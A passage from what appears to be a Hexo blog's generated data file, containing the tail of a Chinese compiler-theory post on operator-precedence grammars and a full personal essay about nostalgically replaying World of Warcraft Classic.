style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span></span></p>\n<p>则称<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>是相对于非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>的、句型<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\beta \\delta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathdefault\" style=\"margin-right:0.03785em;\">δ</span></span></span></span>的一个短语。</p>\n</blockquote>\n<p>这两个性质很好证明。</p>\n<h5 id=\"任意两个非终结符之间的优先关系\"><a class=\"markdownIt-Anchor\" href=\"#任意两个非终结符之间的优先关系\"></a> 任意两个非终结符之间的优先关系</h5>\n<p>设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个算符文法，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>是任意两个终结符，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>P</mi><mo separator=\"true\">,</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">P, Q,R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>是非终结符，定义算符优先关系：（这里打不出带点的小于号、大于号和等于号，所以用常规的符号代替）</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>=</mo><mi>b</mi><mtext> </mtext><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mtext> </mtext><mi>P</mi><mo>→</mo><mo>…</mo><mi>a</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mi>P</mi><mtext> </mtext><mo>→</mo><mo>…</mo><mi>a</mi><mi>Q</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>&lt;</mo><mi>b</mi><mtext> </mtext><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mi>P</mi><mo>→</mo><mo>…</mo><mi>a</mi><mi>R</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">且</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>Q</mi><mi>b</mi><mo>…</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>&gt;</mo><mi>b</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mi>P</mi><mo>→</mo><mo>…</mo><mi>R</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">且</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mo>…</mo><mi>a</mi><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mo>…</mo><mi>a</mi><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;a=b\\,当且仅当\\,G\\,中含有形如\\,P\\rightarrow\\dots ab\\dots\\,或P\\,\\rightarrow\\dots aQb \\dots\\,的规则\\\\\n&amp;a&lt;b\\,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots aR\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}b\\dots\\,或\\,R\\stackrel{+}{\\Rightarrow}Qb\\dots\\\\\n&amp;a&gt;b,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots Rb\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}\\dots a\\,或\\,R\\stackrel{+}{\\Rightarrow}\\dots aQ\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.970402000000002em;vertical-align:-2.235201000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7352010000000004em;\"><span style=\"top:-4.970402em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.235201em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.235201000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7352010000000004em;\"><span style=\"top:-4.970402em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">Q</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span></span></span><span style=\"top:-3.235201em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">Q</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.235201000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>需要注意的是，终结符之间的算符优先关系与终结符的<strong>出现顺序</strong>是有关的。</p>\n<h5 id=\"算符优先文法\"><a class=\"markdownIt-Anchor\" href=\"#算符优先文法\"></a> 算符优先文法</h5>\n<p>设算符文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>不含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>规则，若对于任意两个终结符，它们的算符优先关系唯一，那<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>就是算符优先文法。</p>\n<h3 id=\"lr分析法\"><a class=\"markdownIt-Anchor\" href=\"#lr分析法\"></a> LR分析法</h3>\n"},{"title":"重温魔兽世界怀旧服有感","top_img":false,"cover":"/img/wow.jpg","date":"2020-11-03T14:07:27.000Z","_content":"\n虽然明天晚上还有ICS Quiz，但我还是抵挡不了DNA的反应，开了一张WOW的怀旧服月卡。玩了一下之后，我马上就后悔自己白花了这75块钱了。\n\n我始终认为WOW是**最好玩、最优秀**的网络游戏。WOW就是魔兽世界\n\nWOW是我在初中的时候玩的。对我来说，那是一段传奇般的经历。很遗憾，我在那段时间并没有意识去记录。因此我费尽心思才找到一张很有年代感的游戏截图。图中是我的主角色，血精灵术士，骑着坐骑凤凰，飞在奥格瑞玛力量谷的上空。\n\n{% img \"/img/wow2.jpg\" %}\n\n为什么那是一段传奇般的经历，因为当时的我真的**把所有精力**都放在游戏里了。对当时的我而言，艾泽拉斯才是我的心之所向。你无法想象我在5.4末期的时候做出橙色披风时有多开心。而那个时候，我也没有像现在这样开始**意识到时间的珍贵**。对于一个有网瘾的小屁孩来说，玩游戏就是最开心的了。甚至到了初三，大家都开始收心中考了、连和我一起玩WOW的朋友都开始AFK(away from keyboard)的时候，我仍然没有意识到危机感，我还是在艾泽拉斯叱咤风云、且不亦乐乎。\n\n我不会因为最后中考考得仍然还不错而觉得当时的我很牛逼，可现在的我切切实实地觉得那段时间弥足珍贵。当时没有竞争意识，也不会因为peer pressure而发愁。因为我想的，只是快点放学让我回家玩游戏和想办法糊弄掉今天的作业。\n\n今天创建了一个人类法师，做了一个小时的新手任务之后我就关游戏了，因为还有很多事情需要做。我才意识到，即使暴雪响应了广大玩家的号召，开设了**怀旧服**，我也没有办法感受到之前那份单纯的快乐了。那段经历和那段特殊时期的自己，永远只能作为遥远的记忆供我回味了。\n\n今天做新手村任务的时候，组了一个也在打野怪的圣骑士。打了一会儿之后，他和我说：“你先打着，我去给孩子批改作业。”\n我其实是幸运的，我能作为最后那一批90后赶上80后黄金时代的末班车，即使并不是那么完整，也让我尝尽了甜头。我的童年、中学时期都没有被补课班、舞蹈班、特长班所填满，我可以随意地在刚刚兴起的互联网青涩时代中遨游。我用过迅雷、网友快车，也混过论坛和贴吧，玩过魔兽世界，用过诸如“打酱油”、“神马”、“赶脚”这样的网络用语甚至还用过火星文。我真的觉得自己是幸运的。\n\n顺便分享一个国外玩家拍的微电影《AFK》，讲述了魔兽世界引起的**网瘾**的故事。很幽默，也不乏深度。\n\n<iframe width=\"100%\" height=\"200px\" src=\"//player.bilibili.com/player.html?aid=38902&bvid=BV1qx411c7BA&cid=65098&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>","source":"_posts/重温魔兽世界怀旧服有感.md","raw":"---\ntitle: 重温魔兽世界怀旧服有感\ntop_img: false\ncover: /img/wow.jpg\ndate: 2020-11-03 22:07:27\ntags:\n- 杂谈\n---\n\n虽然明天晚上还有ICS Quiz，但我还是抵挡不了DNA的反应，开了一张WOW的怀旧服月卡。玩了一下之后，我马上就后悔自己白花了这75块钱了。\n\n我始终认为WOW是**最好玩、最优秀**的网络游戏。WOW就是魔兽世界\n\nWOW是我在初中的时候玩的。对我来说，那是一段传奇般的经历。很遗憾，我在那段时间并没有意识去记录。因此我费尽心思才找到一张很有年代感的游戏截图。图中是我的主角色，血精灵术士，骑着坐骑凤凰，飞在奥格瑞玛力量谷的上空。\n\n{% img \"/img/wow2.jpg\" %}\n\n为什么那是一段传奇般的经历，因为当时的我真的**把所有精力**都放在游戏里了。对当时的我而言，艾泽拉斯才是我的心之所向。你无法想象我在5.4末期的时候做出橙色披风时有多开心。而那个时候，我也没有像现在这样开始**意识到时间的珍贵**。对于一个有网瘾的小屁孩来说，玩游戏就是最开心的了。甚至到了初三，大家都开始收心中考了、连和我一起玩WOW的朋友都开始AFK(away from keyboard)的时候，我仍然没有意识到危机感，我还是在艾泽拉斯叱咤风云、且不亦乐乎。\n\n我不会因为最后中考考得仍然还不错而觉得当时的我很牛逼，可现在的我切切实实地觉得那段时间弥足珍贵。当时没有竞争意识，也不会因为peer pressure而发愁。因为我想的，只是快点放学让我回家玩游戏和想办法糊弄掉今天的作业。\n\n今天创建了一个人类法师，做了一个小时的新手任务之后我就关游戏了，因为还有很多事情需要做。我才意识到，即使暴雪响应了广大玩家的号召，开设了**怀旧服**，我也没有办法感受到之前那份单纯的快乐了。那段经历和那段特殊时期的自己，永远只能作为遥远的记忆供我回味了。\n\n今天做新手村任务的时候，组了一个也在打野怪的圣骑士。打了一会儿之后，他和我说：“你先打着，我去给孩子批改作业。”\n我其实是幸运的，我能作为最后那一批90后赶上80后黄金时代的末班车，即使并不是那么完整，也让我尝尽了甜头。我的童年、中学时期都没有被补课班、舞蹈班、特长班所填满，我可以随意地在刚刚兴起的互联网青涩时代中遨游。我用过迅雷、网友快车，也混过论坛和贴吧，玩过魔兽世界，用过诸如“打酱油”、“神马”、“赶脚”这样的网络用语甚至还用过火星文。我真的觉得自己是幸运的。\n\n顺便分享一个国外玩家拍的微电影《AFK》，讲述了魔兽世界引起的**网瘾**的故事。很幽默，也不乏深度。\n\n<iframe width=\"100%\" height=\"200px\" src=\"//player.bilibili.com/player.html?aid=38902&bvid=BV1qx411c7BA&cid=65098&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>","slug":"重温魔兽世界怀旧服有感","published":1,"updated":"2020-11-11T09:57:48.130Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckiszi5ar000q98wagv3zf56z","content":"<p>虽然明天晚上还有ICS Quiz，但我还是抵挡不了DNA的反应，开了一张WOW的怀旧服月卡。玩了一下之后，我马上就后悔自己白花了这75块钱了。</p>\n<p>我始终认为WOW是<strong>最好玩、最优秀</strong>的网络游戏。WOW就是魔兽世界</p>\n<p>WOW是我在初中的时候玩的。对我来说，那是一段传奇般的经历。很遗憾，我在那段时间并没有意识去记录。因此我费尽心思才找到一张很有年代感的游戏截图。图中是我的主角色，血精灵术士，骑着坐骑凤凰，飞在奥格瑞玛力量谷的上空。</p>\n<img src=\"/img/wow2.jpg\" class=\"\">\n<p>为什么那是一段传奇般的经历，因为当时的我真的<strong>把所有精力</strong>都放在游戏里了。对当时的我而言，艾泽拉斯才是我的心之所向。你无法想象我在5.4末期的时候做出橙色披风时有多开心。而那个时候，我也没有像现在这样开始<strong>意识到时间的珍贵</strong>。对于一个有网瘾的小屁孩来说，玩游戏就是最开心的了。甚至到了初三，大家都开始收心中考了、连和我一起玩WOW的朋友都开始AFK(away from keyboard)的时候，我仍然没有意识到危机感，我还是在艾泽拉斯叱咤风云、且不亦乐乎。</p>\n<p>我不会因为最后中考考得仍然还不错而觉得当时的我很牛逼，可现在的我切切实实地觉得那段时间弥足珍贵。当时没有竞争意识，也不会因为peer pressure而发愁。因为我想的，只是快点放学让我回家玩游戏和想办法糊弄掉今天的作业。</p>\n<p>今天创建了一个人类法师，做了一个小时的新手任务之后我就关游戏了，因为还有很多事情需要做。我才意识到，即使暴雪响应了广大玩家的号召，开设了<strong>怀旧服</strong>，我也没有办法感受到之前那份单纯的快乐了。那段经历和那段特殊时期的自己，永远只能作为遥远的记忆供我回味了。</p>\n<p>今天做新手村任务的时候，组了一个也在打野怪的圣骑士。打了一会儿之后，他和我说：“你先打着，我去给孩子批改作业。”<br />\n我其实是幸运的，我能作为最后那一批90后赶上80后黄金时代的末班车，即使并不是那么完整，也让我尝尽了甜头。我的童年、中学时期都没有被补课班、舞蹈班、特长班所填满，我可以随意地在刚刚兴起的互联网青涩时代中遨游。我用过迅雷、网友快车，也混过论坛和贴吧，玩过魔兽世界，用过诸如“打酱油”、“神马”、“赶脚”这样的网络用语甚至还用过火星文。我真的觉得自己是幸运的。</p>\n<p>顺便分享一个国外玩家拍的微电影《AFK》，讲述了魔兽世界引起的<strong>网瘾</strong>的故事。很幽默，也不乏深度。</p>\n<iframe width=\"100%\" height=\"200px\" src=\"//player.bilibili.com/player.html?aid=38902&bvid=BV1qx411c7BA&cid=65098&page=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> </iframe>","site":{"data":{}},"excerpt":"","more":"<p>虽然明天晚上还有ICS 